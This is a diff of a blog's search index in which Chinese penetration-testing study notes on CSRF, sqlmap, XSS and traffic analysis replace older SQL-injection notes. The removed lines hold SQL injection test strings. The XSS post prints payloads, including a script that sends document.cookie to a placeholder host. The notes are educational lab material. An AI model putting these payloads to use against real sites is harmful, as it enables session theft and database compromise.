@@ -1,97 +1,312 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>SQL注入</title>
-    <url>/2019/10/15/SQL%E6%B3%A8%E5%85%A5(1)/</url>
+    <title>Web安全_CSRF漏洞</title>
+    <url>/2019/10/16/Web%E5%AE%89%E5%85%A8%20_CSRF%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<hr>
 <a id="more"></a>
-<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><blockquote>
-<p>1’ and length(database())&gt;7–+</p>
+
+<h6 id="csrf这个漏洞与xss漏洞的恩怨情仇，别看这两个漏洞只差几个字符，但他们的区别可是天差地别。"><a href="#csrf这个漏洞与xss漏洞的恩怨情仇，别看这两个漏洞只差几个字符，但他们的区别可是天差地别。" class="headerlink" title="csrf这个漏洞与xss漏洞的恩怨情仇，别看这两个漏洞只差几个字符，但他们的区别可是天差地别。"></a>csrf这个漏洞与xss漏洞的恩怨情仇，别看这两个漏洞只差几个字符，但他们的区别可是天差地别。</h6><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>今天继续给大家讲前端漏洞，今天介绍的是csrf这个漏洞与xss漏洞的恩怨情仇，别看这两个漏洞只差几个字符，但他们的区别可是天差地别。</p>
+<h3 id="Csrf漏洞"><a href="#Csrf漏洞" class="headerlink" title="Csrf漏洞"></a>Csrf漏洞</h3><p><strong>CSRF</strong>（Cross-site request forgery）跨站请求伪造：也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p>
+<h3 id="Csrf漏洞分析"><a href="#Csrf漏洞分析" class="headerlink" title="Csrf漏洞分析"></a>Csrf漏洞分析</h3><h4 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h4><p>其实说白了，csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）。这个操作不是用户真正想要执行的。</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>首先找到一个目标站点，csrf存在的危害主要存在于可以执行操作的地方，那么我在我搭建的一个环境中的登录后页面进行测试</p>
+<p><img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571714230372.png" alt="1571714230372"></p>
+<p> 环境就是一个wordpress的环境，可以直接去官网下载<br> 我们选择用户界面进行测试，可以看到现在只有一个用户 </p>
+<pre><code>![1571714296992](C:\Users\孙腾飞\AppData\Roaming\Typora\typora-user-images\1571714296992.png)</code></pre><p> 下面添加用户 </p>
+<p>​          <img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571714334699.png" alt="1571714334699"></p>
+<p> 利用burp进行截断    <img src="C:\Users\孙腾飞\AppData\Roaming\Typora\typora-user-images\1571714427682.png" alt="1571714427682"></p>
+<p> 利用burp的自带插件来利用csrf </p>
+<p><img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571714517082.png" alt="1571714517082"></p>
+<p>会生成一个可以利用csrf.html<br>修改标注内的值，来保证添加的用户不会重复造成无法添加 </p>
+<p><img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571714756085.png" alt="1571714756085"></p>
+<p> 在浏览器中尝试</p>
+<p>​              <img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571714850017.png" alt="1571714850017"></p>
+<p> 执行按键，发现除了本来存在的第一个用户和我们通过正常手段加入的用户双增加了一个新的test1用户，这个用户就是我们利用csrf点击图片中的submit来执行的操作，因为是我们的测试没有对页面进行修改和直接触发，如果是攻击者利用JS来让用户进行直接的触发，只要打开了相应的页面就会执行这一行为。 </p>
+<p>​          <img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571714874056.png" alt="1571714874056"></p>
+<p>​          <img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571714893477.png" alt="1571714893477"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>漏洞依靠用户标识危害网站，利用网站对用户标识的信任，欺骗用户的浏览器发送HTTP请求给目标站点，另外可以通过IMG标签会触发一个GET请求，可以利用它来实现CSRF攻击。<br>CSRF攻击依赖下面的假定：</p>
+<ul>
+<li>攻击者了解受害者所在的站点</li>
+<li>攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie</li>
+<li>目标站点没有对用户在网站行为的第二授权</li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQLMAP</title>
+    <url>/2019/10/15/SQLMAP/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+
+<h3 id="SqlMap介绍及分析"><a href="#SqlMap介绍及分析" class="headerlink" title="SqlMap介绍及分析"></a>SqlMap介绍及分析</h3><blockquote>
+<p>SQLMAP是一种开源渗透测试工具，可自动执行SQL注入缺陷的检测和开发过程，并接管数据库服务器。它有强大的检测引擎,针对不同类型的数据库提供多样的渗透测试功能选项，实现数据库识别、数据获取、访问DBMS\操作系统甚至通过带外数据连接的方式执行操作系统的命令。，以及从数据库指纹识别、从数据库获取数据、访问底层文件的广泛范围的交换机通过带外连接在操作系统上执行命令.</p>
 </blockquote>
 <blockquote>
-<p>1’ and ascii(left(database(),1))&gt;122 115 s</p>
+<p>SQLMAP支持的数据包括：MySQL, Oracle,PostgreSQL,Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库。</p>
 </blockquote>
-<h3 id="sql-mid-函数"><a href="#sql-mid-函数" class="headerlink" title="sql mid 函数"></a>sql mid 函数</h3><p>sql left<br>sql sleep<br>1’ and if(ascii(left(database(),1))=115,sleep(5),1)–+</p>
-<h3 id="sql-注入原理"><a href="#sql-注入原理" class="headerlink" title="sql 注入原理"></a>sql 注入原理</h3><h3 id="SQL注入危害"><a href="#SQL注入危害" class="headerlink" title="SQL注入危害"></a>SQL注入危害</h3><ol>
-<li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>破坏硬盘数据，瘫痪全系统。<br>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大</li>
-</ol>
-<h3 id="sql-注入分类"><a href="#sql-注入分类" class="headerlink" title="sql 注入分类"></a>sql 注入分类</h3><ul>
-<li><ol>
-<li>注入点类型 数值型 字符型</li>
-</ol>
-</li>
-<li><ol start="2">
-<li>注入点位置（get注入，post注入，cookie注入，搜索型注入，http头注入）</li>
-</ol>
-</li>
-<li><ol start="3">
-<li>页面回显（报错注入，布尔盲注，时间盲注）</li>
-</ol>
-</li>
-<li><ol>
-<li>按照页面有无回显。<h3 id="sql-注入的位置"><a href="#sql-注入的位置" class="headerlink" title="sql 注入的位置"></a>sql 注入的位置</h3></li>
-</ol>
-</li>
-<li><p>登录框  </p>
-</li>
-<li><p>搜索框 </p>
-</li>
-<li><p>url参数值get </p>
-</li>
-<li><p>url参数值post </p>
-</li>
-<li><p>信息设置</p>
-</li>
-</ul>
-<h3 id="sql注入判断依据"><a href="#sql注入判断依据" class="headerlink" title="sql注入判断依据"></a>sql注入判断依据</h3><ul>
-<li>sql注入漏洞挖掘方式   </li>
-<li>使用工具safe3wvs webCruiser appscan awvs  手工测试</li>
-<li>value+0 -0 *1 /1</li>
-<li>1 or 1=1    1)or(1=1</li>
-<li>数字型——内联sql注入</li>
-</ul>
-<h3 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h3><ul>
-<li><p>数字型 字符型</p>
-</li>
-<li><p>and 1=1/and 1=2 and ‘1’=’1 and ‘1’=’2<br>…..</p>
-</li>
-<li><p>数据库的比较运算符  1&lt;2 真  2&lt;1 假   数字 数字</p>
-</li>
-<li><p>数字 与字符 串   1’ and’nima’&gt;’0  存在  1’ and’nima’=’0  1’ and’nima’=’1 不存在</p>
-</li>
-<li><p>字符串 与 字符串 比较    a 97  65 A  ‘a’&lt;’b’   1’ and’nima’=’nima</p>
-<h3 id="数据库注释"><a href="#数据库注释" class="headerlink" title="数据库注释"></a>数据库注释</h3></li>
-<li><input checked disabled type="checkbox"> <p>sql server和oracle  </p>
-</li>
-</ul>
-<ol>
-<li>–</li>
-<li>/* */</li>
-</ol>
+<p>SQLMAP目前支持的注入方式包括（默认全进行）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br><span class="line"> Q: Inline SQL Injection  (内联注入)</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li><input checked disabled type="checkbox"> mysql</li>
-<li>/*  */ – #</li>
-<li>1’ or 1=1 order by 3– </li>
-<li>1’ union select 1,1#</li>
-<li>1’/<em>!union</em>/ /<em>!select <em>/ 1,1#  注释非 /</em>！</em>/</li>
-<li>1’ /<em>!5553,union</em>//*!5553,select */1,1#</li>
-<li>access sqlite asp</li>
-<li>mssql mysql oracle php jsp</li>
-<li>and (select count(*) from jishi)&gt;0</li>
-<li>len(url)  asc(mid(bianliang,3,1))</li>
-<li>sql mid</li>
-<li>sleep()</li>
-<li>benchmark()禁止使用</li>
-<li>select benchmark <h3 id="MYSQL延迟注入"><a href="#MYSQL延迟注入" class="headerlink" title="MYSQL延迟注入"></a>MYSQL延迟注入</h3></li>
-<li>延迟注入是通过页面返回的时间来判断的</li>
-<li>不同的mysql数据库版本延迟注入的语句也不同</li>
-<li>mysql &gt;= 5.0 的可以使用sleep()进行查询</li>
-<li>mysql &lt; 5.0 可以使用benchmark()进行查询</li>
-<li>benchark()的用法</li>
-<li>benchark(n,sql语句)n为查询次数</li>
-<li>通常查询时间的增多返回时间变得缓慢来判断是否存在延迟注入</li>
-<li>select benchark(1000,select * from admin)</li>
+<li><p>SQLMAP分析：</p>
+<p>SQLMAP的功能模块参数由几大类构成（见下表），分别是： </p>
+<table>
+<thead>
+<tr>
+<th>Target:At least one of these options has to be provided to define the target(s)</th>
+<th>目标：至少为目标提供一个选项</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Request:These options can be used to specify how to connect to the target URL</td>
+<td>请求：这些选项用于指定如何连接目标URL的方法</td>
+</tr>
+<tr>
+<td>Optimization:These options can be used to optimize the performance of sqlmap</td>
+<td>优化：这些选项用来优化sqlmap的性能</td>
+</tr>
+<tr>
+<td>Injection:These options can be used to specify which parameters to test for,</td>
+<td>注入：这些选项用于指定测试那些参数，提供注入payload和篡改脚本</td>
+</tr>
+<tr>
+<td>Detection:These options can be used to customize the detection phase</td>
+<td>侦测：这些选项用于侦测阶段的定制化</td>
+</tr>
+<tr>
+<td>Techniques:These options can be used to tweak testing of specific SQL injection techniques</td>
+<td>技巧：这些选项用于调整特定sql注入技术的技巧</td>
+</tr>
+<tr>
+<td>Enumeration:These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements</td>
+<td>枚举：这些选项可用于枚举后端数据库管理系统信息、表里的数据接口，此外还可以运行你的sql语句</td>
+</tr>
+<tr>
+<td>Brute force:These options can be used to run brute force checks</td>
+<td>暴力执行：这些选项用于暴力检查</td>
+</tr>
+<tr>
+<td>User-defined function injection:These options can be used to create custom user-defined functions</td>
+<td>用户定义注入函数:这些选项用于建立用户定义函数</td>
+</tr>
+<tr>
+<td>File system access:These options can be used to access the back-end database management system underlying file system</td>
+<td>访问文件系统：这些选项用于访问后端数据库管理系统的底层文件系统</td>
+</tr>
+<tr>
+<td>Operating system access:These options can be used to access the back-end database management system underlying operating system</td>
+<td>操作系统连接：这些选项用于连接后端DBMS底层的os</td>
+</tr>
+<tr>
+<td>Windows registry access:These options can be used to access the back-end database management system Windows registry</td>
+<td>windows 注册表连接：这些选项用于连接后端DBMS的windows 注册表</td>
+</tr>
+<tr>
+<td>General: These options can be used to set some general working parameters</td>
+<td>通用：这些选项用于设置一些通用参数</td>
+</tr>
+</tbody></table>
+<p>SQLMAP下载及学习地址：</p>
+<p> 下载：.tar.gz或者.zip</p>
+</li>
 </ul>
+<p>Homepage: <a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org</a> </p>
+<p><strong>CommitsRSS学习地址：</strong></p>
+<p><strong>feed:</strong><a href="https://github.com/sqlmapproject/sqlmap/commits/master.atom" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/commits/master.atom</a></p>
+<p><strong>Issue tracker:</strong><a href="https://github.com/sqlmapproject/sqlmap/issues" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/issues</a></p>
+<p><strong>User’s manual:</strong><a href="https://github.com/sqlmapproject/sqlmap/wiki" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/wiki</a></p>
+<p><strong>(FAQ):</strong><a href="https://github.com/sqlmapproject/sqlmap/wiki/FAQ" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/wiki/FAQ</a></p>
+<p><strong>Twitter:</strong>@sqlmap</p>
+<p><strong>Demos:</strong><a href="http://www.youtube.com/user/inquisb/videos" target="_blank" rel="noopener">http://www.youtube.com/user/inquisb/videos</a></p>
+<p><strong>Screenshots:</strong><a href="https://github.com/sqlmapproject/sqlmap/wiki/Screenshots" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/wiki/Screenshots</a></p>
+<h3 id="Sqlmap使用经验总结"><a href="#Sqlmap使用经验总结" class="headerlink" title="Sqlmap使用经验总结"></a>Sqlmap使用经验总结</h3><p> 以下参数在进行SQL注入时配置恰当会使得注入攻击事半功倍。 </p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="Sqlmap实操语句"><a href="#Sqlmap实操语句" class="headerlink" title="Sqlmap实操语句"></a>Sqlmap实操语句</h3><table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -101,18 +316,353 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入</title>
-    <url>/2019/10/15/SQL%E6%B3%A8%E5%85%A5/</url>
+    <title>XSS（跨站脚本攻击）</title>
+    <url>/2019/10/15/XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89/</url>
     <content><![CDATA[<hr>
 <a id="more"></a>
-<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><blockquote>
+
+<h1 id="1-XSS漏洞概述"><a href="#1-XSS漏洞概述" class="headerlink" title="1.XSS漏洞概述"></a>1.XSS漏洞概述</h1><h2 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h2><p>跨站脚本攻击—XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。</p>
+<h2 id="1-2-XSS漏洞原理"><a href="#1-2-XSS漏洞原理" class="headerlink" title="1.2 XSS漏洞原理"></a>1.2 XSS漏洞原理</h2><h3 id="1-2-1-反射型"><a href="#1-2-1-反射型" class="headerlink" title="1.2.1 反射型"></a>1.2.1 反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS 主要是GET类型</p>
+<h3 id="1-2-2-存储型"><a href="#1-2-2-存储型" class="headerlink" title="1.2.2 存储型"></a>1.2.2 存储型</h3><p>持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。 例如：<code>alert(/xss/)</code></p>
+<h3 id="1-2-3-DOM型"><a href="#1-2-3-DOM型" class="headerlink" title="1.2.3 DOM型"></a>1.2.3 DOM型</h3><p>DOM型是特殊的反射型XSS 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3-XSS危害"><a href="#1-3-XSS危害" class="headerlink" title="1.3 XSS危害"></a>1.3 XSS危害</h2><h3 id="1-3-1-盗取管理员cookie"><a href="#1-3-1-盗取管理员cookie" class="headerlink" title="1.3.1 盗取管理员cookie"></a>1.3.1 盗取管理员cookie</h3><p>盗取管理员的cookie然后登陆后台，获取到后台权限。</p>
+<h3 id="1-3-2-XSS蠕虫攻击"><a href="#1-3-2-XSS蠕虫攻击" class="headerlink" title="1.3.2 XSS蠕虫攻击"></a>1.3.2 XSS蠕虫攻击</h3><p>可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用</p>
+<h2 id="1-4-常用XSS语句"><a href="#1-4-常用XSS语句" class="headerlink" title="1.4 常用XSS语句"></a>1.4 常用XSS语句</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/);&lt;/script&gt; //经典语句</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href = javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-5-XSS漏洞绕过"><a href="#1-5-XSS漏洞绕过" class="headerlink" title="1.5 XSS漏洞绕过"></a>1.5 XSS漏洞绕过</h2><h3 id="1-5-1-JS编码"><a href="#1-5-1-JS编码" class="headerlink" title="1.5.1 JS编码"></a>1.5.1 JS编码</h3><p>三个八进制数；如果不够前面补0 两个十六进制数字；如果不够前面补0 四个十六进制数字；如果不够前面补0 控制字符</p>
+<h3 id="1-5-2-HTML实体编码"><a href="#1-5-2-HTML实体编码" class="headerlink" title="1.5.2 HTML实体编码"></a>1.5.2 HTML实体编码</h3><p>以<code>&amp;</code>开始<code>;</code>结束</p>
+<h3 id="1-5-3-URL编码"><a href="#1-5-3-URL编码" class="headerlink" title="1.5.3 URL编码"></a>1.5.3 URL编码</h3><p>%27 考虑HTML的渲染方式选择合适的编码方式进行测试</p>
+<h2 id="1-6-XSS漏洞浏览器问题"><a href="#1-6-XSS漏洞浏览器问题" class="headerlink" title="1.6 XSS漏洞浏览器问题"></a>1.6 XSS漏洞浏览器问题</h2><p>有些浏览器会过滤掉一些js脚本，在测试的时候需要关闭对JavaScript的检测。</p>
+<h2 id="0×06-XSS漏洞防御"><a href="#0×06-XSS漏洞防御" class="headerlink" title="0×06 XSS漏洞防御"></a>0×06 XSS漏洞防御</h2><p>过滤输入的数据，和非法字符<code>‘ “ &lt; &gt; on* 等”’</code> 输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等</p>
+<h1 id="2-测试方法"><a href="#2-测试方法" class="headerlink" title="2. 测试方法"></a>2. 测试方法</h1><h2 id="2-1-手工测试"><a href="#2-1-手工测试" class="headerlink" title="2.1 手工测试"></a>2.1 手工测试</h2><p>这里我们选取DVWA靶场进行手工测试。</p>
+<h3 id="2-1-1"><a href="#2-1-1" class="headerlink" title="2.1.1"></a>2.1.1</h3><h3 id="2-1-1-1-DVWA-简介"><a href="#2-1-1-1-DVWA-简介" class="headerlink" title="2.1.1.1 DVWA 简介"></a>2.1.1.1 DVWA 简介</h3><p>DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。</p>
+<h4 id="2-1-1-3-测试过程"><a href="#2-1-1-3-测试过程" class="headerlink" title="2.1.1.3 测试过程"></a>2.1.1.3 测试过程</h4><p> ** Low ** ** Low_DOM XSS ** 用 <img src="##" onerror="alert(document.cookie)"> 即可触发XSS  </p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>流量分析</title>
+    <url>/2019/10/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+
+<h3 id="流量分析一般过程"><a href="#流量分析一般过程" class="headerlink" title="流量分析一般过程"></a>流量分析一般过程</h3><ul>
+<li><p>如果企业内网受到恶意软件感染，从流量上应该如何分析感染过程？确定内网中的感染情况</p>
+</li>
+<li><p><strong>已知自身的网络环境</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">局域网范围 191.168.1.0/24 （即191.168.1.0到191.168.1.255） </span><br><span class="line">局域网网关 191.168.1.1 </span><br><span class="line">局域网广播地址 191.168.1.255</span><br><span class="line">域 timbershade.info</span><br><span class="line">域控制器 191.168.1.2 – Timbershade-DC</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>需要解决的问题</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">被感染的Windows主机的IP地址是什么？</span><br><span class="line">被感染的Windows主机的MAC地址是什么？</span><br><span class="line">被感染的Windows主机的计算机名是什么？</span><br><span class="line">被感染的Windows主机的用户的帐户名是什么？</span><br><span class="line">发送到被感染的Windows主机的可执行文件的SHA256文件<span class="built_in">hash</span>是什么？</span><br><span class="line">参考IDS警报，这是什么类型的感染?</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤1-确定分析目标的ip"><a href="#步骤1-确定分析目标的ip" class="headerlink" title="步骤1 确定分析目标的ip"></a>步骤1 确定分析目标的ip</h3><p>使用Statistics菜单选项</p>
+<p>已经知道局域网的ip范围是191.168.1.0/24（即191.168.1.0到191.168.1.255），如果，Conversations中看到只有一个IP地址191.168.1.109既不是域控制器(191.168.1.2)也不是广播地址(191.168.1.255)。另外，IDS警报文件只显示了191.168.1.109这个ip的警报。</p>
+</li>
+</ul>
+<h3 id="步骤2-查找IP地址与MAC地址和计算机名关联关系"><a href="#步骤2-查找IP地址与MAC地址和计算机名关联关系" class="headerlink" title="步骤2 查找IP地址与MAC地址和计算机名关联关系"></a>步骤2 查找IP地址与MAC地址和计算机名关联关系</h3><p>​        <strong>方法一：通过DHCP协议查看</strong></p>
+<p>​        DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域        网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、        Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。</p>
+<pre><code>可以通过查看DHCP流量(过滤语法:bootp)将IP地址、MAC地址和计算机名，三者关联起来。 
+
+**方法二：通过NetBIOS协议查看** </code></pre><p>​        根据NetBIOS / NBNS – Wireshark Wiki，NetBIOS名字服务 即 NetBIOS Name Service                   (NBNS）是 NetBIOS-over-TCP协议套件的一部分，此服务通常在Windows系统上称为WINS         (Windows Internet Name Service) 。 传输协议：通常NBNS使用UDP作为其传输协议。众所周        知的NBNS流量UDP端口是137。（NBNS也可以使用TCP作为其某些操作的传输协议，尽管在实        践中可能永远不会这样做，TCP端口是137）。 WINS (Windows Internet Name Service)：名字        服务，功能包括名字注册和名字解析，简单的说这里的名字解析功能，NBNS（windows下称为        WINS）将“NetBIOS名字”转换为ip地址。 WINS提供了一个分布式的动态更新的数据库，能在路        由网络的环境中动态地对IP地址和NETBios名的映射进行注册与查询。 WINS用来注册“NetBIOS        计算机名”，并在需要时将它解析成为IP地址。（其实这个功能比较像DNS协议，它们都是将人类        可读的名称转换为IP地址）</p>
+<p>​        可以通过查看 NBNS流量(过滤语法:NBNS)一样能得到“IP地址与MAC地址和计算机名关联关系”。 </p>
+<h3 id="步骤3-查找Windows用户的帐户名"><a href="#步骤3-查找Windows用户的帐户名" class="headerlink" title="步骤3 查找Windows用户的帐户名"></a>步骤3 查找Windows用户的帐户名</h3><pre><code>使用以下Wireshark过滤语法:</code></pre><p>​         kerberos.CNameString and !(kerberos.CNameString contains $)</p>
+<p>​        看到kerberos.CNameString为margaret.dunn，得到了Windows用户的帐户名：                                       margaret.dunn。</p>
+<p>​        为什么kerberos协议的流量中有Windows用户的帐户名？</p>
+<p>​        原理：</p>
+<p>​        因为Kerberos认证过程中，客户机用户以明文方式发送AS-REQ（认证请求）到密钥分发中心        KDC（Key Distribution Center）以向AS（ Authentication Server）认证服务进行认证，要求得        到某服务器的证书。</p>
+<p>​        AS-REQ（认证请求）中包含Windows用户的帐户名，所以可以从流量中的AS-REQ（认证请求）        中找到Windows用户的帐户名。</p>
+<h3 id="步骤4-确定威胁类型"><a href="#步骤4-确定威胁类型" class="headerlink" title="步骤4 确定威胁类型"></a>步骤4 确定威胁类型</h3><p>​        使用 EmergingThreats (ET) 规则集，从 IDS（Security Onion的Sguil）发现的这些警报。</p>
+<p>​        根据IDS警报，可以看到警报列表中最下面的警报为: ET TROJAN ABUSE.CH SSL Blacklist                        Malicious SSL certificate detected (Dridex)</p>
+<p>​        Dridex的ssl证书被IDS黑名单规则匹配到，所以应该是Dridex感染。</p>
